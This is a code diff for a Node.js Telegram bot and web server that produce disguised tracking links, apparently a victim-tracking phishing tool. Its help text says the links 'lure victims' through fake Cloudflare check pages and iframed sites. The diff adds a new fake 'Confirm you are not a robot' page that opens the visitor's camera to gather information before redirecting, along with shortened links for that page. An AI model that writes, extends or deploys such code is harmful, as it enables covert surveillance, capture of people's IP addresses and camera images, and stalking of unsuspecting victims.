@@ -47,7 +47,7 @@ app.get("/w/:path/:uri", (req, res) => {
   if (req.params.path != null) {
     res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   } else {
-    res.redirect("https://t.me/kannadagamershub01");
+    res.redirect("https://instagram.com/mithun.gowda.b");
   }
 });
 
@@ -57,7 +57,17 @@ app.get("/c/:path/:uri", (req, res) => {
   if (req.params.path != null) {
     res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
   } else {
-    res.redirect("https://t.me/kannadagamershub01");
+    res.redirect("https://instagram.com/mithun.gowda.b");
+  }
+});
+
+app.get("/r/:path/:uri", (req, res) => {
+  const ip = req.headers['x-forwarded-for']?.split(",")[0] || req.connection?.remoteAddress || req.ip;
+  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+  if (req.params.path != null) {
+    res.render("crobot", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+  } else {
+    res.redirect("https://instagram.com/mithun.gowda.b");
   }
 });
 
@@ -80,9 +90,7 @@ bot.on('message', async (msg) => {
       reply_markup: JSON.stringify({
         "inline_keyboard": [
           [{ text: "Create Link", callback_data: "crenew" }],
-          [{ text: "Join Us", url: "https://t.me/kannadagamershub01" }],
-          [{ text: "Follow us", url: "http://instagram.com/kannada_gamers_hub" }],
-          [{ text: "Contact Us", url: "https://instagram.com/mithun.gowda.b" }]
+          [{ text: "Follow Us on", url: "https://instagram.com/mithun.gowda.b" }]
         ]
       })
     };
@@ -90,9 +98,9 @@ bot.on('message', async (msg) => {
   } else if (msg.text == "/create") {
     createNew(chatId, msg.chat);
   } else if (msg.text == "/help") {
-    bot.sendMessage(chatId, ` Through this bot you can track peoples just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications.\n\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.\n\n( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\n\nContact at http://instagram.com/mithun.gowda.b`);
+    bot.sendMessage(chatId, ` Through this bot you can track peoples just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 3 links which you can use to track people.\n\nSpecifications.\n\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.\n3. Crobot Link: This method will show a \"Confirm you are not a robot\" page and display camera preview to gather information and afterwards victim will be redirected to destinationed URL.\n\n( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\n\nContact at http://instagram.com/mithun.gowda.b`);
   } else if (msg.text == "/aboutus") {
-    bot.sendMessage(chatId, 'Developer :\nName: *MithunGowda.B*Email: mithungowda.b7411@gmail.com\nInstagram: http://instagram.com/mithun.gowda.b\n\nContent :\nName: *Manvanth* (Appu)\nEmail: kannadagamershub@gmail.com\nInstagram: https://www.instagram.com/________star_shadow________ \n\n Publisher :\nName: *Nithin* (Niki)\nInstagram: https://www.instagram.com/_mr_dynamic__');
+    bot.sendMessage(chatId, 'Developer :\nName: *MithunGowda.B*Email: mithungowda.b7411@gmail.com\nInstagram: http://instagram.com/mithun.gowda.b\n\nContent :\nName: *Manvanth* (Appu)\nEmail: kannadagamershub@gmail.com\nInstagram: https://www.instagram.com/_.appu_kannadiga \n\n Publisher :\nName: *Nithin* (Niki)\nInstagram: https://www.instagram.com/dynamic_nithi_');
   } else if (msg.text == "/admin") {
     if (ADMIN_TELEGRAM_ID && msg.chat.id.toString() === ADMIN_TELEGRAM_ID.toString()) {
       let report = `📊 *Admin Report*\n\nTotal Unique Bot Users: ${Object.keys(botUsers).length}\n\n*User Details & Link Counts:*\n`;
@@ -129,20 +137,23 @@ async function createLink(cid, msg, chatDetails) {
     };
     const cUrl = `${hostURL}/c/${url}`;
     const wUrl = `${hostURL}/w/${url}`;
+    const rUrl = `${hostURL}/r/${url}`;
 
     bot.sendChatAction(cid, "typing");
 
     if (use1pt) {
       const x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
       const y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
+      const z = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(rUrl)}`).then(res => res.json());
 
-      let f = "", g = "";
+      let f = "", g = "", h = "";
       for (let c in x) f += x[c] + "\n";
       for (let c in y) g += y[c] + "\n";
+      for (let c in z) h += z[c] + "\n";
 
-      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
+      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🤖 Confirm Not a Robot Page Link\n${h}\n\n🌐 WebView Page Link\n${g}`, m);
     } else {
-      bot.sendMessage(cid, `New links have been created successfully.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
+      bot.sendMessage(cid, `New links have been created successfully. You can use any one of the below links.\nURL: ${msg}\n\n✅ Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🤖 Confirm Not a Robot Page Link\n${rUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
     }
 
     userLinkCounts[cid] = (userLinkCounts[cid] || 0) + 1;
@@ -246,3 +257,5 @@ app.listen(5000, () => {
   console.log("App Running on Port 5000!");
 });
 
+
+  
